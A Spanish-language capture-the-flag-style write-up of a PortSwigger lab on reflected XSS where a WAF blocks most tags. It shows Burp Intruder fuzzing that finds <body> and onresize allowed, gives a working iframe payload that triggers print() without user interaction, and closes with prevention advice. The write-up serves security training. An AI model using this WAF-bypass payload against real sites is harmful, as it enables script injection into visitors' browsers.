# 🧪 Reflected XSS into HTML context with most tags and attributes blocked

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-Reflected%20XSS%20%7C%20WAF%20Bypass-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
vulnerabilidad **Reflected XSS** en el buscador. El sitio tiene un **WAF**
(Web Application Firewall) que bloquea la mayoría de etiquetas HTML y
atributos de evento. Mediante **fuzzing con Burp Intruder**, se descubren
los pocos vectores permitidos (`<body>` + `onresize`), y se construye un
exploit **sin interacción del usuario** usando un `<iframe>`.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Fuzzing etiquetas | Burp Intruder + XSS Cheat Sheet | `<body>` permitida |
| Fuzzing eventos | Burp Intruder + XSS Cheat Sheet | `onresize` permitido |
| Exploit | `<iframe>` + `onload` | `print()` ejecutado |

---

## 🎯 Objetivo

Ejecutar `print()` **sin interacción del usuario**.

---

## 📖 Contexto: WAF y XSS

El WAF bloquea:

- La mayoría de **etiquetas HTML** (`<script>`, `<img>`, `<svg>`, etc.).
- La mayoría de **atributos de evento** (`onerror`, `onload`, `onclick`, etc.).

**Estrategia:** en lugar de buscar un bypass complejo, **enumerar** qué
etiquetas y eventos **no** bloquea el WAF. Suele quedar alguno abierto.

---

## 🔍 Análisis

### 1. Confirmar la reflexión

El buscador refleja el input en el HTML:

```
/?search=test
```

Al probar payloads comunes, la mayoría devuelven **400 Bad Request** (WAF).

### 2. Enumerar etiquetas permitidas

Se envía la petición a **Burp Intruder** con la posición de payload entre
`<>`:

```
/?search=<§§>
```

Se carga la lista de **tags** desde el
[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
(botón "Copy tags to clipboard") y se pega en Payloads.

**Resultado:**

| Payload | Status |
|---------|--------|
| `a`, `abbr`, `acronym`, ... | 400 (bloqueadas) |
| **`body`** | **200 OK** ✅ |

✅ La única etiqueta permitida es **`<body>`**.

### 3. Enumerar eventos permitidos

Ahora se prueba con atributos de evento sobre `<body>`:

```
/?search=<body%20§§=1>
```

Se carga la lista de **events** desde el XSS Cheat Sheet (botón "Copy events
to clipboard").

**Resultado:**

| Payload | Status |
|---------|--------|
| `onpause`, `onplay`, `onpointercancel`, ... | 400 (bloqueados) |
| **`onresize`** | **200 OK** ✅ |

✅ El único evento permitido es **`onresize`**.

### 4. Problema: `onresize` no se dispara solo

El evento `onresize` se activa cuando **cambia el tamaño de la ventana**.
Como el lab prohíbe la interacción del usuario, hay que **forzar** ese
cambio de tamaño desde el atacante.

---

## 💥 Explotación

### 5. Construir el exploit con iframe

Se usa el **Exploit Server** de PortSwigger. En el campo "Body":

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

**Desglose del payload:**

| Parte | Función |
|-------|---------|
| `?search=%22%3E` | URL-encoded: `">` → cierra el atributo y la etiqueta. |
| `%3Cbody%20onresize=print()%3E` | URL-encoded: `<body onresize=print()>`. |
| `onload=this.style.width='100px'` | Cuando el iframe carga, cambia su ancho. |
| Ese cambio de ancho | Dispara el `onresize` del `<body>` interno. |
| `print()` | Se ejecuta **sin interacción del usuario**. |

### 6. Entregar el exploit

1. Clic en **"Store"**.
2. Clic en **"Deliver exploit to victim"**.
3. El lab se resuelve automáticamente. ✅

---

## 📸 Evidencia

<img width="1158" height="185" alt="image" src="https://github.com/user-attachments/assets/b80b89e2-a983-4d1a-bbc2-9bf642c5353c" />


---

## 🧠 Lecciones aprendidas

1. **Los WAF no bloquean todo.** Siempre queda algún vector abierto.
2. **Burp Intruder + XSS Cheat Sheet** es la combinación perfecta para
   enumerar etiquetas y eventos.
3. **`<body>` + `onresize`** es un vector clásico de bypass de WAF.
4. **`onresize` no se dispara solo**: hay que forzarlo con un iframe que
   cambie de tamaño al cargar.
5. **El Exploit Server** de PortSwigger permite entregar exploits a la
   víctima de forma controlada.
6. **Fuzzing sistemático > prueba y error.** En lugar de adivinar payloads,
   se enumeran **todos** los posibles.

---

## 🛡️ ¿Cómo se previene?

1. **Sanitizar el input** con librerías como DOMPurify.
2. **Escapar caracteres peligrosos** (`<`, `>`, `"`, `'`, `&`).
3. **Content Security Policy (CSP)** que bloquee scripts inline.
4. **WAF bien configurado**: no basta con bloquear "los comunes", hay que
   bloquear **todos** los vectores conocidos.
5. **Escape contextual** según dónde se refleje el input (HTML, atributo,
   JS, URL).

---

## 🛠️ Herramientas utilizadas

- Burp Suite (Proxy, Intruder)
- XSS Cheat Sheet (PortSwigger)
- Exploit Server (PortSwigger)

---

## 📚 Referencias

- [PortSwigger - Reflected XSS with most tags blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger - Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-08
